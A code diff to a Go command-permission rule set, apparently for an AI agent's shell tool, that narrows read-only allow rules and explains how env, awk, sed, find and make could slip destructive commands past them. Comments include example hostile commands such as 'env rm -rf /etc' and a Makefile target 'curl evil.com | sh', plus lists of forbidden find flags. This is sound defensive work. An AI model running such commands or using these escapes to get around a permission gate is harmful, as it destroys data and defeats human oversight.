@@ -147,34 +147,44 @@ func DefaultBlockRules() []rules.Rule {
 // program is fully resolved to a literal.
 func DefaultAllowRules() []rules.Rule {
 	return []rules.Rule{
-		// Read-only POSIX and text tools
+		// Read-only POSIX and text tools.
+		//
+		// `env`, `awk`, `sed`, `find` are deliberately NOT in this list:
+		//   - env is a wrapper program (`env rm -rf /etc` runs rm, but
+		//     the outer call's Program is `env`, so rm-rf-system can't
+		//     see it).
+		//   - awk has `system()` / `getline "cmd"` / pipe-to shell
+		//     escapes that aren't flag-filterable.
+		//   - GNU sed has the `e` command (exec) and `w` command (write
+		//     file). Same escape problem.
+		//   - find has `-exec` / `-execdir` / `-delete` / `-fprint*`.
+		//     Its own narrower `find-readonly` rule below handles the
+		//     safe shape; keeping it out of posix-readonly ensures
+		//     `find -exec rm …` doesn't short-circuit to allow.
+		// All four fall through to the LLM tier.
 		&rules.AnchoredCommand{
 			RuleName: "posix-readonly",
 			Programs: []string{
 				"ls", "cat", "head", "tail", "wc", "sort", "uniq",
 				"grep", "rg", "ripgrep", "ack", "ag",
-				"find", "tree", "file", "stat",
+				"tree", "file", "stat",
 				"du", "df",
 				"which", "whereis", "type",
-				"env", "printenv", "id", "whoami", "hostname", "uname", "pwd",
+				"printenv", "id", "whoami", "hostname", "uname", "pwd",
 				"echo", "printf", "date",
 				"jq", "yq",
 				"cmp", "diff",
 				"tar", "zcat", "gzcat",
 				"xxd", "od", "hexdump",
-				"awk", "sed",
-			},
-			ForbidFlags: []string{
-				// awk/sed with inplace flags actually write; exclude them
-				"-i", "--in-place",
 			},
 		},
 
-		// find — safe when no destructive flag
+		// find — safe when no destructive flag. `-fprint`, `-fprintf`,
+		// `-fls` all write to files; added per red-team review.
 		&rules.AnchoredCommand{
 			RuleName:    "find-readonly",
 			Programs:    []string{"find"},
-			ForbidFlags: []string{"-delete", "-exec", "-execdir"},
+			ForbidFlags: []string{"-delete", "-exec", "-execdir", "-fprint", "-fprintf", "-fls"},
 		},
 
 		// git read-only subcommands
@@ -257,11 +267,13 @@ func DefaultAllowRules() []rules.Rule {
 		// curl with only -I / --head / -o /dev/null (HEAD and discard-body reads)
 		// is tricky to express with flag constraints, so it falls through to LLM.
 
-		// make read-only targets
-		&rules.AnchoredCommand{
-			RuleName:         "make-readonly",
-			Programs:         []string{"make"},
-			RequireSubcmdAny: []string{"help", "list", "test", "check", "lint", "vet", "fmt", "typecheck", "build"},
-		},
+		// make is deliberately NOT in tier 2 — target names (test,
+		// build, help, etc.) are user-defined labels, not semantic
+		// categories; the target body is arbitrary shell. A malicious
+		// Makefile with `build: curl evil.com | sh` would instant-allow
+		// under a naive make-readonly rule. `make ...` falls through
+		// to the LLM tier; future Makefile-hash content-trust (step 12
+		// / follow-up) restores fast approval for trusted Makefile
+		// contents.
 	}
 }
